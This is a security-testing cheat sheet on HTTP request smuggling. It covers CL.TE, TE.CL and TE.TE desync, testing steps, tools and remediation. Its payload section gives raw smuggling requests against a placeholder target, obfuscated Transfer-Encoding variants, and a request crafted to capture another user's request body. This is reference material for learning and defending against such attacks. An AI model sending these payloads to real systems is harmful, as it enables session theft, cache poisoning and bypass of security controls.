# HTTP Request Smuggling

## Overview
HTTP Request Smuggling exploits discrepancies between how front-end (reverse proxy/CDN) and back-end servers parse HTTP request boundaries — specifically conflicting `Content-Length` (CL) and `Transfer-Encoding` (TE) headers. By crafting an ambiguous request, an attacker can "smuggle" a partial HTTP request that is prepended to the next legitimate user's request, enabling cache poisoning, session hijacking, bypassing security controls, and even RCE on the back-end.

## How It Works
HTTP/1.1 supports two methods to define request body length:
- `Content-Length: 100` — body is exactly 100 bytes.
- `Transfer-Encoding: chunked` — body is sent in size-prefixed chunks, terminated by `0\r\n\r\n`.

When front-end and back-end disagree on which header takes precedence:
- **CL.TE**: Front-end uses Content-Length, back-end uses Transfer-Encoding. Smuggled body queues on back-end.
- **TE.CL**: Front-end uses Transfer-Encoding, back-end uses Content-Length. Partial request queued.
- **TE.TE**: Both support TE but one can be tricked with obfuscated headers: `Transfer-Encoding: xchunked`.

## Impact
- Capturing other users' requests (including session tokens, credentials).
- Bypassing front-end security controls (WAF, authentication).
- Cache poisoning affecting all users.
- Reflected XSS via poisoned requests.
- SSRF to internal back-end services.
- Gaining web shell access in some configurations.

## Where to Look
- Sites with a reverse proxy/load balancer in front of an application server.
- CDN-fronted applications (Cloudflare, Akamai, AWS CloudFront).
- Nginx/HAProxy in front of Apache/IIS/Tomcat.
- Any architecture where HTTP passes through multiple parsing stages.

## Testing Steps
1. Identify the architecture: are there proxy headers like `Via`, `X-Forwarded-For` in responses?
2. Use Burp Suite's HTTP Request Smuggler (BApp) for automated detection.
3. **CL.TE test**: Send a request with both CL and TE headers and look for timeouts or unexpected 404s.
4. **TE.CL test**: Send chunked request with incorrect final byte count.
5. Confirm with a "poisoning" test that causes the next request to get a garbled response.
6. Use timing-based detection (differential responses).

## Payloads / Techniques
```http
# CL.TE smuggling detection
# Front-end uses CL=6, sees "0\r\n\r\n" as body
# Back-end uses TE=chunked, treats "X" as start of next request
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

```http
# TE.CL smuggling detection
# Front-end uses TE=chunked, sees "0\r\n\r\n" as complete body
# Back-end uses CL=3, reads "0\r\n" = 3 bytes, leaves "\r\nX" queued
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

1
X
0


```

```http
# Obfuscated TE header (TE.TE bypass)
Transfer-Encoding: xchunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
```

```bash
# Using smuggler.py for automated detection
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.com/ -v

# Capture victim's request (after confirming CL.TE):
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

username=
# Next user's request appended here → their body captured in our controlled endpoint log
```

## Burp Suite Tips
- **HTTP Request Smuggler** (BApp Store) — automated CL.TE, TE.CL, TE.TE detection.
- In **Repeater**, disable the "Update Content-Length" option to craft manual CL+TE conflict.
- Turn off "Normalize HTTP/1 line endings" in Repeater settings.
- Use **Burp Collaborator** for OOB detection of smuggled requests.
- Lab practice: PortSwigger Web Security Academy has excellent HTTP Smuggling labs.

## Tools
- HTTP Request Smuggler (Burp BApp) — automated scanner
- smuggler.py — https://github.com/defparam/smuggler
- h2cSmuggler — https://github.com/BishopFox/h2cSmuggler (HTTP/2 variant)

## Remediation
- Ensure front-end and back-end servers use the same HTTP parsing library and version.
- Configure the front-end to normalize ambiguous requests before passing to the back-end.
- Reject requests with both `Content-Length` and `Transfer-Encoding` headers.
- Upgrade to HTTP/2 end-to-end (HTTP/2 eliminates the CL/TE ambiguity).
- Keep all proxy and application server software updated.
- Use a WAF rule to detect and block smuggling attempts.

## References
https://portswigger.net/web-security/request-smuggling
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
https://owasp.org/www-community/attacks/HTTP_Request_Smuggling
